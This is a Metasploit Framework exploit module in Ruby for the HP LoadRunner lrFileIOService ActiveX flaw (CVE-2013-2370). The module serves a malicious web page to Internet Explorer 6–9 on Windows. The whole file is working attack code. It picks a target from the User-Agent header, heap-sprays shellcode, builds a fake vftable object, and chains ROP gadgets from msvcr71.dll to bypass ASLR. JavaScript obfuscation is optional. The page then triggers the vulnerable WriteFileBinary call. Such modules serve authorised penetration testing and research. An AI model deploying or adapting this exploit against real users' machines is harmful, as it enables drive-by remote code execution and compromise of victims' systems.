##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb
  include Msf::Exploit::Remote::BrowserAutopwn

  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "6.0",
    :ua_maxver  => "9.0",
    :javascript => true,
    :os_name    => OperatingSystems::WINDOWS,
    :rank       => Rank,
    :classid    => "{8D9E2CC7-D94B-4977-8510-FB49C361A139}",
    :method     => "WriteFileBinary"
  })

  def initialize(info={})
    super(update_info(info,
      'Name'           => "HP LoadRunner lrFileIOService ActiveX Remote Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability on the lrFileIOService ActiveX, as installed
        with HP LoadRunner 11.50. The vulnerability exists in the WriteFileBinary method
        where user provided data is used as a memory pointer.  This module has been tested
        successfully on IE6-IE9 on Windows XP, Vista and 7, using the LrWebIERREWrapper.dll
        11.50.2216.0. In order to bypass ASLR the no aslr compatible module msvcr71.dll is
        used. This one is installed with HP LoadRunner.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-2370' ],
          [ 'OSVDB', '95640' ],
          [ 'BID', '61441'],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-182/' ],
          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03862772' ]
        ],
      'Payload'        =>
        {
          'Space' => 1024,
          'DisableNops' => true,
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      'DefaultOptions'  =>
        {
          'PrependMigrate' => true
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # LrWebIERREWrapper.dll 11.50.2216.0
          [ 'Automatic', {} ],
          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,  'Offset' => '0x5F4' } ],
          [ 'IE 8 on Windows XP SP3', { 'Rop' => :jre, 'Offset' => '0x5f4' } ],
          [ 'IE 7 on Windows Vista',  { 'Rop' => nil,  'Offset' => '0x5f4' } ],
          [ 'IE 8 on Windows Vista',  { 'Rop' => :jre, 'Offset' => '0x5f4' } ],
          [ 'IE 8 on Windows 7',      { 'Rop' => :jre, 'Offset' => '0x5f4' } ],
          [ 'IE 9 on Windows 7',      { 'Rop' => :jre, 'Offset' => '0x5fe' } ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Jul 24 2013",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
      ], self.class)

  end

  def get_target(agent)
    #If the user is already specified by the user, we'll just use that
    return target if target.name != 'Automatic'

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
    ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

    ie_name = "IE #{ie}"

    case nt
    when '5.1'
      os_name = 'Windows XP SP3'
    when '6.0'
      os_name = 'Windows Vista'
    when '6.1'
      os_name = 'Windows 7'
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        print_status("Target selected as: #{t.name}")
        return t
      end
    end

    return nil
  end

  def ie_heap_spray(my_target, p)
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))

    # Land the payload at 0x0c0c0c0c
    case my_target
    when targets[6]
      # IE 9 on Windows 7
      js = %Q|
      function randomblock(blocksize)
      {
        var theblock = "";
        for (var i = 0; i < blocksize; i++)
        {
          theblock += Math.floor(Math.random()*90)+10;
        }
        return theblock;
      }

      function tounescape(block)
      {
        var blocklen = block.length;
        var unescapestr = "";
        for (var i = 0; i < blocklen-1; i=i+4)
        {
          unescapestr += "%u" + block.substring(i,i+4);
        }
        return unescapestr;
      }

      var heap_obj = new heapLib.ie(0x10000);
      var code = unescape("#{js_code}");
      var nops = unescape("#{js_random_nops}");
      while (nops.length < 0x80000) nops += nops;
      var offset_length = #{my_target['Offset']};
      for (var i=0; i < 0x1000; i++) {
        var padding = unescape(tounescape(randomblock(0x1000)));
        while (padding.length < 0x1000) padding+= padding;
        var junk_offset = padding.substring(0, offset_length);
        var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);
        while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
        sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
        heap_obj.alloc(sprayblock);
      }
      |

    else
      # For IE 6, 7, 8
      js = %Q|
      var heap_obj = new heapLib.ie(0x20000);
      var code = unescape("#{js_code}");
      var nops = unescape("#{js_nops}");
      while (nops.length < 0x80000) nops += nops;
      var offset = nops.substring(0, #{my_target['Offset']});
      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
      while (shellcode.length < 0x40000) shellcode += shellcode;
      var block = shellcode.substring(0, (0x80000-6)/2);
      heap_obj.gc();
      for (var i=1; i < 0x300; i++) {
        heap_obj.alloc(block);
      }
      |

    end

    js = heaplib(js, {:noobfu => true})

    if datastore['OBFUSCATE']
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    return js
  end

  def get_payload(t, cli)
    code = payload.encoded

    fake_object = [
      0x0c0c0c0c, # fake vftable pointer
      0x0c0c0c14  # function pointer
    ].pack("V*")

    # No rop. Just return the payload.
    return fake_object + code if t['Rop'].nil?

    # Both ROP chains generated by mona.py - See corelan.be
    case t['Rop']
    when :jre
      print_status("Using msvcr71.dll ROP")
      fake_object = [
        0x0c0c0c0c, # fake vftable pointer
        0x7c342643  # xchg eax,esp # pop edi # add byte ptr ds:[eax],al # pop ecx # retn
      ].pack("V*")
      rop_payload = fake_object + generate_rop_payload('java', code)#, {'pivot'=>stack_pivot})
    end

    return rop_payload
  end

  def load_exploit_html(my_target, cli)
    p  = get_payload(my_target, cli)
    js = ie_heap_spray(my_target, p)
    object_id = rand_text_alpha(rand(10) + 8)

    html = %Q|
    <html>
    <head>
    <script>
    #{js}
    </script>
    </head>
    <body>
    <object classid='clsid:8D9E2CC7-D94B-4977-8510-FB49C361A139' id='#{object_id}'></object>
    <script language='javascript'>
    #{object_id}.WriteFileBinary("#{rand_text_alpha(4+ rand(4))}", 0x0c0c0c0c);
    </script>
    </body>
    </html>
    |

    return html
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    uri   = request.uri
    print_status("Requesting: #{uri}")

    my_target = get_target(agent)
    # Avoid the attack if no suitable target found
    if my_target.nil?
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    html = load_exploit_html(my_target, cli)
    html = html.gsub(/^\t\t/, '')
    print_status("Sending HTML...")
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

end